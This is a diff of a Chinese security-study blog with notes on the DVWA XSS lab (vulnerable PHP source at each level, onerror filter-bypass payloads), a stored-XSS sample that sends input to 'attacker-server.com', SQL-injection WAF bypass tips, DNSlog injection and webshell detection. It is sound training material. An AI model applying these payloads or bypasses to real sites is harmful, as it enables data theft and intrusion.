+<p>服务器将<script>替换为空，可以使用onerror来进行注入</p>
+<p><img src="XSS/image-20230625230514177.png" alt="image-20230625230514177"></p>
+<p>也可以尝试大小写绕过或者双写绕过</p>
+<p><img src="XSS/image-20230625230639492.png" alt="image-20230625230639492"></p>
+<p><img src="XSS/image-20230625230702369.png" alt="image-20230625230702369"></p>
+<h3 id="high"><a href="#high" class="headerlink" title="high"></a>high</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">header</span> (<span class="string">&quot;X-XSS-Protection: 0&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// Is there any input?</span></span><br><span class="line"><span class="keyword">if</span>( <span class="title function_ invoke__">array_key_exists</span>( <span class="string">&quot;name&quot;</span>, <span class="variable">$_GET</span> ) &amp;&amp; <span class="variable">$_GET</span>[ <span class="string">&#x27;name&#x27;</span> ] != <span class="literal">NULL</span> ) &#123;</span><br><span class="line">    <span class="comment">// Get input</span></span><br><span class="line">    <span class="variable">$name</span> = <span class="title function_ invoke__">preg_replace</span>( <span class="string">&#x27;/&lt;(.*)s(.*)c(.*)r(.*)i(.*)p(.*)t/i&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$_GET</span>[ <span class="string">&#x27;name&#x27;</span> ] );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Feedback for end user</span></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;pre&gt;Hello $&#123;name&#125;&lt;/pre&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure>
+<p>使用模糊匹配方法(*表示一个或多个字符，i表示不区分大小写)来过滤script标签，所以onerror还是可以使用</p>
+<h3 id="impossible"><a href="#impossible" class="headerlink" title="impossible"></a>impossible</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// Is there any input?</span></span><br><span class="line"><span class="keyword">if</span>( <span class="title function_ invoke__">array_key_exists</span>( <span class="string">&quot;name&quot;</span>, <span class="variable">$_GET</span> ) &amp;&amp; <span class="variable">$_GET</span>[ <span class="string">&#x27;name&#x27;</span> ] != <span class="literal">NULL</span> ) &#123;</span><br><span class="line">    <span class="comment">// Check Anti-CSRF token</span></span><br><span class="line">    <span class="title function_ invoke__">checkToken</span>( <span class="variable">$_REQUEST</span>[ <span class="string">&#x27;user_token&#x27;</span> ], <span class="variable">$_SESSION</span>[ <span class="string">&#x27;session_token&#x27;</span> ], <span class="string">&#x27;index.php&#x27;</span> );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Get input</span></span><br><span class="line">    <span class="variable">$name</span> = <span class="title function_ invoke__">htmlspecialchars</span>( <span class="variable">$_GET</span>[ <span class="string">&#x27;name&#x27;</span> ] );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Feedback for end user</span></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;pre&gt;Hello $&#123;name&#125;&lt;/pre&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Generate Anti-CSRF token</span></span><br><span class="line"><span class="title function_ invoke__">generateSessionToken</span>();</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure>
+<p>htmlspecialchars() 函数用于把预定义的字符 “&lt;” 和 “&gt;” 转换为 HTML 实体，防止了我们注入 HTML 标签。例如我们注入 “”，htmlspecialchars 函数会将 &lt; 和 &gt; 转换成 html 实体而不是当做标签，所以我们插入的语句并不会被执行。同时加入 Anti-CSRF token 防护 CSRF 攻击，进一步提高安全性。</p>
 <p>防御方法</p>
 <ol>
 <li>输入验证和过滤：对于用户输入的数据，进行严格的验证和过滤，确保只接受预期的数据类型和格式。可以使用输入过滤器、白名单机制或编码技术来防止恶意脚本的注入。</li>
@@ -709,7 +1514,8 @@ d = R(2\frac{\rho _M}{\rho_m})^\frac{1}{3}</script><p><img src="/2023/02/21/%E7%
 <li>安全开发实践：在开发过程中，遵循安全的编码实践，如避免直接拼接用户输入到HTML页面、使用模板引擎等，以减少XSS攻击的风险。</li>
 <li>安全审计和漏洞扫描：定期进行安全审计和漏洞扫描，以发现和修复潜在的反射型XSS漏洞和其他安全问题。</li>
 </ol>
-<h2 id="存储型"><a href="#存储型" class="headerlink" title="存储型"></a>存储型</h2><p>攻击步骤</p>
+<h2 id="存储型"><a href="#存储型" class="headerlink" title="存储型"></a>存储型</h2><p>恶意代码存储在目标网站上，可以多次进行触发</p>
+<p>攻击步骤</p>
 <ol>
 <li>攻击者找到目标网站上存在安全漏洞的输入点，如用户提交的评论、留言、论坛帖子等。</li>
 <li>攻击者在输入点处注入包含恶意脚本的内容，通常是HTML、JavaScript或其他前端代码。</li>
@@ -717,8 +1523,34 @@ d = R(2\frac{\rho _M}{\rho_m})^\frac{1}{3}</script><p><img src="/2023/02/21/%E7%
 <li>当其他用户访问包含恶意脚本的页面时，恶意脚本会被从存储中检索出来并在其浏览器中执行，从而导致攻击成功。</li>
 </ol>
 <figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line">  <span class="comment">// 恶意脚本示例：窃取用户的敏感信息并发送到攻击者的服务器</span></span><br><span class="line">  <span class="keyword">const</span> maliciousScript = <span class="string">`</span></span><br><span class="line"><span class="string">    &lt;script&gt;</span></span><br><span class="line"><span class="string">      const userInput = document.getElementById(&#x27;input&#x27;).value;</span></span><br><span class="line"><span class="string">      const img = new Image();</span></span><br><span class="line"><span class="string">      img.src = &#x27;http://attacker-server.com/steal.php?data=&#x27; + encodeURIComponent(userInput);</span></span><br><span class="line"><span class="string">      document.body.appendChild(img);</span></span><br><span class="line"><span class="string">    &lt;/script&gt;</span></span><br><span class="line"><span class="string">  `</span>;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 注入恶意脚本</span></span><br><span class="line">  <span class="keyword">const</span> userInput = <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&#x27;input&#x27;</span>).<span class="property">value</span>;</span><br><span class="line">  <span class="keyword">const</span> comment = <span class="variable language_">document</span>.<span class="title function_">createElement</span>(<span class="string">&#x27;div&#x27;</span>);</span><br><span class="line">  comment.<span class="property">innerHTML</span> = userInput + maliciousScript;</span><br><span class="line">  <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&#x27;comments&#x27;</span>).<span class="title function_">appendChild</span>(comment);</span><br><span class="line">&lt;/script&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-<h2 id="dom"><a href="#dom" class="headerlink" title="dom"></a>dom</h2><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">h1</span> <span class="attr">id</span>=<span class="string">&quot;title&quot;</span>&gt;</span>Welcome<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">    <span class="comment">// 恶意脚本示例：篡改页面标题</span></span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">const</span> userInput = <span class="built_in">decodeURIComponent</span>(location.<span class="property">hash</span>.<span class="title function_">substr</span>(<span class="number">1</span>)); <span class="comment">// 从URL的哈希部分获取用户输入</span></span></span><br><span class="line"><span class="language-javascript">    <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&#x27;title&#x27;</span>).<span class="property">innerText</span> = userInput; <span class="comment">// 修改页面标题</span></span></span><br><span class="line"><span class="language-javascript">  </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>
-]]></content>
+<h3 id="low-1"><a href="#low-1" class="headerlink" title="low"></a>low</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( <span class="variable">$_POST</span>[ <span class="string">&#x27;btnSign&#x27;</span> ] ) ) &#123;</span><br><span class="line">    <span class="comment">// Get input</span></span><br><span class="line">    <span class="variable">$message</span> = <span class="title function_ invoke__">trim</span>( <span class="variable">$_POST</span>[ <span class="string">&#x27;mtxMessage&#x27;</span> ] );</span><br><span class="line">    <span class="variable">$name</span>    = <span class="title function_ invoke__">trim</span>( <span class="variable">$_POST</span>[ <span class="string">&#x27;txtName&#x27;</span> ] );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Sanitize message input</span></span><br><span class="line">    <span class="variable">$message</span> = <span class="title function_ invoke__">stripslashes</span>( <span class="variable">$message</span> );</span><br><span class="line">    <span class="variable">$message</span> = ((<span class="keyword">isset</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>]) &amp;&amp; <span class="title function_ invoke__">is_object</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>])) ? <span class="title function_ invoke__">mysqli_real_escape_string</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>],  <span class="variable">$message</span> ) : ((<span class="title function_ invoke__">trigger_error</span>(<span class="string">&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;</span>, E_USER_ERROR)) ? <span class="string">&quot;&quot;</span> : <span class="string">&quot;&quot;</span>));</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Sanitize name input</span></span><br><span class="line">    <span class="variable">$name</span> = ((<span class="keyword">isset</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>]) &amp;&amp; <span class="title function_ invoke__">is_object</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>])) ? <span class="title function_ invoke__">mysqli_real_escape_string</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>],  <span class="variable">$name</span> ) : ((<span class="title function_ invoke__">trigger_error</span>(<span class="string">&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;</span>, E_USER_ERROR)) ? <span class="string">&quot;&quot;</span> : <span class="string">&quot;&quot;</span>));</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Update database</span></span><br><span class="line">    <span class="variable">$query</span>  = <span class="string">&quot;INSERT INTO guestbook ( comment, name ) VALUES ( &#x27;<span class="subst">$message</span>&#x27;, &#x27;<span class="subst">$name</span>&#x27; );&quot;</span>;</span><br><span class="line">    <span class="variable">$result</span> = <span class="title function_ invoke__">mysqli_query</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>],  <span class="variable">$query</span> ) <span class="keyword">or</span> <span class="keyword">die</span>( <span class="string">&#x27;&lt;pre&gt;&#x27;</span> . ((<span class="title function_ invoke__">is_object</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>])) ? <span class="title function_ invoke__">mysqli_error</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>]) : ((<span class="variable">$___mysqli_res</span> = <span class="title function_ invoke__">mysqli_connect_error</span>()) ? <span class="variable">$___mysqli_res</span> : <span class="literal">false</span>)) . <span class="string">&#x27;&lt;/pre&gt;&#x27;</span> );</span><br><span class="line"></span><br><span class="line">    <span class="comment">//mysql_close();</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure>
+<p>trim(string,charlist)：移除charlist中指出字符如\0,\t,\n,\r等<br>stripslashes(string)：删除反斜杠</p>
+<p><img src="XSS/image-20230625231744015.png" alt="image-20230625231744015"></p>
+<p>查看mysql也可以看到代码被写入<br><img src="XSS/image-20230625232546383.png" alt="image-20230625232546383"></p>
+<p>在新的界面登录时也看到了弹窗<br><img src="XSS/image-20230625232712707.png" alt="image-20230625232712707"></p>
+<h2 id="dom"><a href="#dom" class="headerlink" title="dom"></a>dom</h2><p>通过修改网页的dom节点形成xss，由前端进行处理</p>
+<p>DOM—based XSS漏洞是基于文档对象模型Document Objeet Model，DOM)的一种漏洞。DOM是一个与平台、编程语言无关的接口，它允许程序或脚本动态地访问和更新文档内容、结构和样式，处理后的结果能够成为显示页面的一部分。DOM中有很多对象，其中一些是用户可以操纵的，如uRI，location，refelTer等。客户端的脚本程序可以通过DOM动态地检查和修改页面内容，它不依赖于提交数据到服务器端，而从客户端获得DOM中的数据在本地执行，如果DOM中的数据没有经过严格确认，就会产生DOM—based XSS漏洞。</p>
+<p>可能触发DOM型XSS的属性：<br>document.referer属性<br>window.name属性<br>location属性<br>innerHTML属性<br>documen.write属性</p>
+<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">h1</span> <span class="attr">id</span>=<span class="string">&quot;title&quot;</span>&gt;</span>Welcome<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">    <span class="comment">// 恶意脚本示例：篡改页面标题</span></span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">const</span> userInput = <span class="built_in">decodeURIComponent</span>(location.<span class="property">hash</span>.<span class="title function_">substr</span>(<span class="number">1</span>)); <span class="comment">// 从URL的哈希部分获取用户输入</span></span></span><br><span class="line"><span class="language-javascript">    <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&#x27;title&#x27;</span>).<span class="property">innerText</span> = userInput; <span class="comment">// 修改页面标题</span></span></span><br><span class="line"><span class="language-javascript">  </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<h3 id="low-2"><a href="#low-2" class="headerlink" title="low"></a>low</h3><p>没有保护，直接构造url进行弹窗测试<br><img src="XSS/image-20230625223930138.png" alt="image-20230625223930138"></p>
+<h3 id="medium-1"><a href="#medium-1" class="headerlink" title="medium"></a>medium</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// Is there any input?</span></span><br><span class="line"><span class="keyword">if</span> ( <span class="title function_ invoke__">array_key_exists</span>( <span class="string">&quot;default&quot;</span>, <span class="variable">$_GET</span> ) &amp;&amp; !<span class="title function_ invoke__">is_null</span> (<span class="variable">$_GET</span>[ <span class="string">&#x27;default&#x27;</span> ]) ) &#123;</span><br><span class="line">    <span class="variable">$default</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;default&#x27;</span>];</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># Do not allow script tags</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">stripos</span> (<span class="variable">$default</span>, <span class="string">&quot;&lt;script&quot;</span>) !== <span class="literal">false</span>) &#123;</span><br><span class="line">        <span class="title function_ invoke__">header</span> (<span class="string">&quot;location: ?default=English&quot;</span>);</span><br><span class="line">        <span class="keyword">exit</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p>（1）简单来说，就是过滤掉了“&lt;script”，当函数匹配到 &lt;script 字符串的时候就会将URL后面的参数修正为 ?default=English<br>（2）在这里可以通过onerror事件，在装载文档或图像的过程中如果发生了错误就会触发</p>
+<p>构造payload，闭合select和option后使用onerror<br><img src="XSS/image-20230625224935771.png" alt="image-20230625224935771"></p>
+<p>192.168.3.7/dvwa/vulnerabilities/xss_d/?default=English&lt;/option&gt;&lt;/select&gt;<img src=x onerror=alert('hacker_by_akali')><br><img src="XSS/image-20230625225506113.png" alt="image-20230625225506113"></p>
+<h3 id="high-1"><a href="#high-1" class="headerlink" title="high"></a>high</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// Is there any input?</span></span><br><span class="line"><span class="keyword">if</span> ( <span class="title function_ invoke__">array_key_exists</span>( <span class="string">&quot;default&quot;</span>, <span class="variable">$_GET</span> ) &amp;&amp; !<span class="title function_ invoke__">is_null</span> (<span class="variable">$_GET</span>[ <span class="string">&#x27;default&#x27;</span> ]) ) &#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment"># White list the allowable languages</span></span><br><span class="line">    <span class="keyword">switch</span> (<span class="variable">$_GET</span>[<span class="string">&#x27;default&#x27;</span>]) &#123;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&quot;French&quot;</span>:</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&quot;English&quot;</span>:</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&quot;German&quot;</span>:</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&quot;Spanish&quot;</span>:</span><br><span class="line">            <span class="comment"># ok</span></span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">default</span>:</span><br><span class="line">            <span class="title function_ invoke__">header</span> (<span class="string">&quot;location: ?default=English&quot;</span>);</span><br><span class="line">            <span class="keyword">exit</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure>
+<p>（1）这里设置了白名单，如果default的值不为”French”、”English”、”German”、”Spanish”的话就重置URL为:?default=English ，这里只是对 default 的变量进行了过滤。</p>
+<p>（2）可以考虑在English后面使用&amp;或者#</p>
+<p><img src="XSS/image-20230625225835680.png" alt="image-20230625225835680"></p>
+<h3 id="impossible-1"><a href="#impossible-1" class="headerlink" title="impossible"></a>impossible</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="comment"># Don&#x27;t need to do anything, protction handled on the client side ?&gt; </span></span><br></pre></td></tr></table></figure>
+<p>输入参数全部无效</p>
+<p>修复方式</p>
+<ul>
+<li>对实体字符进行转义</li>
+<li>使用HTTP only来禁止javascript读取cookie</li>
+<li>输入时校验、浏览器与web应用端采取相同的字符编码</li>
+</ul>
+<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>反射型的恶意代码存在url里，构造好url后可以通过社工、短链等方式诱使他人点击完成恶意代码，但是只能使用一次。存储型恶意代码存在服务器端；dom型取出或执行恶意代码都是由浏览器完成的，属于前端javascript自身的安全漏洞，其他两种都属于服务端安全漏洞。</p>
+</script></p>]]></content>
       <categories>
         <category>web攻防</category>
       </categories>
@@ -781,9 +1613,9 @@ d = R(2\frac{\rho _M}{\rho_m})^\frac{1}{3}</script><p><img src="/2023/02/21/%E7%
   <entry>
     <title>信安基础知识</title>
     <url>/2023/06/10/%E4%BF%A1%E5%AE%89%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/</url>
-    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><p>信息安全基础知识</p>
+    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><p>杂七杂八什么都有的攻防知识</p>
 <span id="more"></span>
-<h2 id="常见协议、中间件默认端口及配置文件"><a href="#常见协议、中间件默认端口及配置文件" class="headerlink" title="常见协议、中间件默认端口及配置文件"></a>常见协议、中间件默认端口及配置文件</h2><div class="table-container">
+<h1 id="常见协议、中间件默认端口及配置文件"><a href="#常见协议、中间件默认端口及配置文件" class="headerlink" title="常见协议、中间件默认端口及配置文件"></a>常见协议、中间件默认端口及配置文件</h1><div class="table-container">
 <table>
 <thead>
 <tr>
@@ -911,14 +1743,55 @@ d = R(2\frac{\rho _M}{\rho_m})^\frac{1}{3}</script><p><img src="/2023/02/21/%E7%
 </tbody>
 </table>
 </div>
-<h2 id="OWASP10"><a href="#OWASP10" class="headerlink" title="OWASP10"></a>OWASP10</h2><h2 id="windows"><a href="#windows" class="headerlink" title="windows"></a>windows</h2><h3 id="常用工具"><a href="#常用工具" class="headerlink" title="常用工具"></a>常用工具</h3><ul>
+<h1 id="OWASP10"><a href="#OWASP10" class="headerlink" title="OWASP10"></a>OWASP10</h1><h2 id="注入"><a href="#注入" class="headerlink" title="注入"></a>注入</h2><h3 id="sql注入绕过常见WAF"><a href="#sql注入绕过常见WAF" class="headerlink" title="sql注入绕过常见WAF"></a>sql注入绕过常见WAF</h3><ol>
+<li>关键字可以用%(只限IIS系列)，select sel%e%ct</li>
+<li>通杀方法，内联注释。如/ <em> !select </em> /，！是取反的意思</li>
+<li>编码、二次编码</li>
+<li>multipart 请求绕过，在post请求中添加一个文件上传可以绕过绝大多数WAF</li>
+<li>参数绕过，复制参数。？id=1&amp;id=1</li>
+<li>组合法。如and可以用&amp;&amp;在进行一个url编码</li>
+<li>替换法。如and改成&amp;&amp;；=可以用like或in等</li>
+</ol>
+<h3 id="判断注入点的思路"><a href="#判断注入点的思路" class="headerlink" title="判断注入点的思路"></a>判断注入点的思路</h3><p>寻找与数据库交互可控的参数，get、post、cookie、referer、UA</p>
+<h3 id="报错注入的函数"><a href="#报错注入的函数" class="headerlink" title="报错注入的函数"></a>报错注入的函数</h3><p>updatexml()<br>exp()<br>extractvalue()<br>GTID_SUBSET</p>
+<h3 id="告警流量特征"><a href="#告警流量特征" class="headerlink" title="告警流量特征"></a>告警流量特征</h3><p>and 1=1<br>or 1=1<br>‘’、””<br>关键字，union、select、order by<br>information_schema</p>
+<h3 id="无回显，利用DNSlog完成注入"><a href="#无回显，利用DNSlog完成注入" class="headerlink" title="无回显，利用DNSlog完成注入"></a>无回显，利用DNSlog完成注入</h3><p>把服务器返回的结果放在域名中，然后读取DNS解析日志来获取想要的信息</p>
+<h4 id="mysql"><a href="#mysql" class="headerlink" title="mysql"></a>mysql</h4><p><img src="/2023/06/10/%E4%BF%A1%E5%AE%89%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/image-20230628214809179.png" alt="image-20230628214809179"></p>
+<h4 id="mssql"><a href="#mssql" class="headerlink" title="mssql"></a>mssql</h4><p><img src="/2023/06/10/%E4%BF%A1%E5%AE%89%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/image-20230628214838119.png" alt="image-20230628214838119"></p>
+<h2 id="失效的身份认证"><a href="#失效的身份认证" class="headerlink" title="失效的身份认证"></a>失效的身份认证</h2><h2 id="敏感数据泄露"><a href="#敏感数据泄露" class="headerlink" title="敏感数据泄露"></a>敏感数据泄露</h2><h2 id="XML外部实体"><a href="#XML外部实体" class="headerlink" title="XML外部实体"></a>XML外部实体</h2><h2 id="失效的访问控制"><a href="#失效的访问控制" class="headerlink" title="失效的访问控制"></a>失效的访问控制</h2><h2 id="安全配置错误"><a href="#安全配置错误" class="headerlink" title="安全配置错误"></a>安全配置错误</h2><h2 id="跨站脚本"><a href="#跨站脚本" class="headerlink" title="跨站脚本"></a>跨站脚本</h2><h2 id="不安全的反序列化"><a href="#不安全的反序列化" class="headerlink" title="不安全的反序列化"></a>不安全的反序列化</h2><h2 id="使用含有已知漏洞的组件"><a href="#使用含有已知漏洞的组件" class="headerlink" title="使用含有已知漏洞的组件"></a>使用含有已知漏洞的组件</h2><h2 id="不足的日志记录和监控"><a href="#不足的日志记录和监控" class="headerlink" title="不足的日志记录和监控"></a>不足的日志记录和监控</h2><h1 id="SHELL"><a href="#SHELL" class="headerlink" title="SHELL"></a>SHELL</h1><h2 id="什么是shell"><a href="#什么是shell" class="headerlink" title="什么是shell"></a>什么是shell</h2><p> 管理输入和输出的地方</p>
+<h2 id="0、1、2、-gt-和-amp-解析"><a href="#0、1、2、-gt-和-amp-解析" class="headerlink" title="0、1、2、&gt;和&amp;解析"></a>0、1、2、&gt;和&amp;解析</h2><ul>
+<li>0 是一个文件描述符，表示标准输入(stdin)</li>
+<li>1 是一个文件描述符，表示标准输出(stdout)</li>
+<li>2 是一个文件描述符，表示标准错误(stderr)</li>
+<li>重定向符&gt;，就是把前面输出的内容重定向到后面指定的位置，其中1&gt;可以省略成&gt;</li>
+<li>&amp;是一个描述符，如果1或2前不加&amp;，会被当成一个文件</li>
+</ul>
+<p>1&gt;&amp;2 意思是把标准输出重定向到标准错误.<br>2&gt;&amp;1 意思是把标准错误输出重定向到标准输出。<br>&amp;&gt;filename 意思是把标准输出和标准错误输出都重定向到文件filename中</p>
+<h2 id="参数"><a href="#参数" class="headerlink" title="参数"></a>参数</h2><figure class="highlight diff"><table><tr><td class="code"><pre><span class="line"><span class="deletion">-i:强制忽略大小写</span></span><br><span class="line"><span class="deletion">-e：指定环境</span></span><br></pre></td></tr></table></figure>
+<h2 id="NAT"><a href="#NAT" class="headerlink" title="NAT"></a>NAT</h2><p>内网地址转换为公网地址，查看自己公网地址直接网络搜我的ip，而nat配置在路由器上及ISP手中，同一个ip地址下可能有很多个主机接入，所以正向shell很难定位目标靶机，所以需要用到反弹shell。感觉和域那边的概念也有一定关系</p>
+<h2 id="反弹shell"><a href="#反弹shell" class="headerlink" title="反弹shell"></a>反弹shell</h2><p>很多协议主要用于远程连接，比如ssh协议、telnet协议等，这个行为叫做获取shell，称为正向shell</p>
+<h2 id="webshell原理"><a href="#webshell原理" class="headerlink" title="webshell原理"></a>webshell原理</h2><p>网页后门，攻击者在入侵一个网站后，通常会将asp或php后门文件与网站服务器web目录下正常的网页文件会混在一起，然后访问后门就可以得到一个命令执行环境，已达到控制网站服务器的目的。</p>
+<p>防御方法为静态特征检测或webshell运行后，B/S数据通过HTTP交互，HTTP请求/响应中可以找到特征。</p>
+<p>例如使用phpstudy搭建一个网点，其中1.php为上传的webshell，构建payload即可执行命令。</p>
+<p><img src="/2023/06/10/%E4%BF%A1%E5%AE%89%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/image-20230626175907532.png" alt="image-20230626175907532"></p>
+<p><img src="/2023/06/10/%E4%BF%A1%E5%AE%89%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/image-20230626175949534.png" alt="image-20230626175949534"></p>
+<p>好处是不会在系统日志中留下痕迹，但是在web日志中可看到记录，如上图可以在apache文件夹下logs中的access.log中留下记录</p>
+<h2 id="如何排查系统内存shell"><a href="#如何排查系统内存shell" class="headerlink" title="如何排查系统内存shell"></a>如何排查系统内存shell</h2><p>判断它是基于什么方法注入的内存马，可以查看web日志是否有可疑的web访问日志</p>
+<p>filter或者listener类型会有大量url请求路径相同参数不同的，或者页面不存在但是返回200的，查看是否有类似哥斯拉、冰蝎相同的url请求，哥斯拉和冰蝎的内存马注入流量特征与普通webshell的流量特征基本吻合。</p>
+<p><img src="/2023/06/10/%E4%BF%A1%E5%AE%89%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/image-20230627181502115.png" alt="image-20230627181502115"></p>
+<h2 id="webshell检测方案"><a href="#webshell检测方案" class="headerlink" title="webshell检测方案"></a>webshell检测方案</h2><ol>
+<li>webshell静态检测：通过匹配特征码、特征值，危险函数来查找webshell</li>
+<li>Webshell动态检测：linux下nobody用户使用bash、sh、zsh等,windows下IIS User使用cmd，这些都是动态特征。攻击者反向连接的话，Agent和IDS都可以抓到。</li>
+<li>webshell日志检测：使用webshell一般不会再系统日志中留下记录，但是会在网站的web日志中留下webshell页面的访问数据和数据提交记录。日志分析检测技术通过大量的日志文件建立请求模型从而检测出异常文件。</li>
+</ol>
+<h1 id="windows"><a href="#windows" class="headerlink" title="windows"></a>windows</h1><h2 id="常用工具"><a href="#常用工具" class="headerlink" title="常用工具"></a>常用工具</h2><ul>
 <li><p>matsc：远程桌面管理工具<br>步骤：目标机：控制面板——系统和安全——系统——远程设置——允许远程连接到此计算机。</p>
 <pre><code>       本机：cmd：matsc，填入ip地址和账户凭据
 </code></pre><p><img src="/2023/06/10/%E4%BF%A1%E5%AE%89%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/image-20230620085716723.png" alt="image-20230620085716723" style="zoom:50%;"><img src="/2023/06/10/%E4%BF%A1%E5%AE%89%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/image-20230620085826664.png" alt="image-20230620085826664" style="zoom:50%;"><img src="/2023/06/10/%E4%BF%A1%E5%AE%89%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/image-20230620085858374.png" alt="image-20230620085858374" style="zoom:50%;"></p>
 <p>请注意选择用户中可能存在用户组everyone，这个用户组致使所有人都可以连接到你的主机，按需设置可连接用户或用户组</p>
